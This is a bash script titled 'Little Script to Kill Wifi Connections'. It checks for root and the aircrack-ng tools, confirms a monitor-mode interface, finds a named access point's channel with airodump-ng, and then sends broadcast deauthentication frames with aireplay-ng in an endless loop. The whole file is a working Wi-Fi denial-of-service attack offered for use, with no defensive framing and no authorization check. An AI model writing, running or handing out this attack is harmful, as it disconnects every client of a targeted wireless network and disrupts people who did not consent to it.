#!/bin/bash

# Created by -> Alex AKA NeuDam
# Little Script to Kill Wifi Connections


declare -a tools=(aireplay-ng airodump-ng timeout iwconfig)

function ctrl_c(){

  echo -e "\n\nExiting....\n"

  sudo kill $(ps aux | grep -i "sudo airodump-ng --essid" | head -n 1 | awk '{print $2}') 2>/dev/null
  sudo kill $(ps aux | grep -i "sudo aireplay-ng -0" | head -n 1 | awk '{print $2}') 2>/dev/null

  exit 0

}

trap ctrl_c SIGINT

function checkerTools(){
  for x in "${tools[@]}"; do
    which $x &>/dev/null
    if [ ! $? -eq 0 ]; then
      echo -e "\nError, $x is not installed\n"
      exit 1
    fi
  done

  echo -e "\n[+] All the tools are installed"
  sleep 1
}

function checkRoot(){

  rootId=$(id -u)


  if [ ! $rootId -eq 0 ]; then
    echo -e "\n[-] Error, you have to run the script as root\n"
    exit 1
  fi

  echo -e "\n[+] You are root!"

  sleep 1

}

function checkInterface(){

  iwconfig $1 | grep -i monitor &>/dev/null

  if [ ! $? -eq 0 ]; then

    echo -e "\n[-] Error, check if the interface exists or is in Monitor Mode\n"
    exit 1

  fi

}

function checkWifiAP(){

  wifiAP=$2

  sudo timeout 5 bash -c "sudo airodump-ng --essid '$wifiAP' $1 > .discoveredWifi"

  cat .discoveredWifi | grep -v "(not associated)" | grep $wifiAP &>/dev/null

  #cp .discoveredWifi hola

  if [ ! $? -eq 0 ]; then
    echo -e "\n[-] Error, check and try again the ESSID\n"
    sudo rm .discoveredWifi
    exit 1

  else

    channel=$(cat .discoveredWifi | grep "$wifiAP" | awk '{print $7}' | sort -u)
    sudo rm .discoveredWifi
    echo -e "\n[+] The Access Point Exists! ["$wifiAP","$channel"]"
    sleep 2
  fi

}

function startAiroDump(){

  echo -e "\n[+] Starting Attack..."

  sudo airodump-ng --essid "$1" --channel $2 $3 &>/dev/null &

  sleep 1

}

function startDauthAttack(){

  clear

  echo -e "\n[+] Attack Started, press double ctrl+c to STOP\n"

  declare -i iteration=0

  while true; do
    iteration=$((iteration+1))
    echo -ne "\r[?] Sending Attack N°$iteration"
    sudo aireplay-ng -0 10 -e "$1" -c FF:FF:FF:FF:FF:FF $2 &>/dev/null
    sleep 1
  done
}

interface=$1
wifiAP=$2

if [[ ! $interface || ! $wifiAP ]]; then
  echo -e "\n[-] Error, use: ./killer.sh <interface> <wifi_ap_name>\n"
  exit 1
fi


checkRoot
checkerTools
checkInterface $interface
checkWifiAP $interface $wifiAP
startAiroDump $wifiAP $channel $interface
startDauthAttack $wifiAP $interface
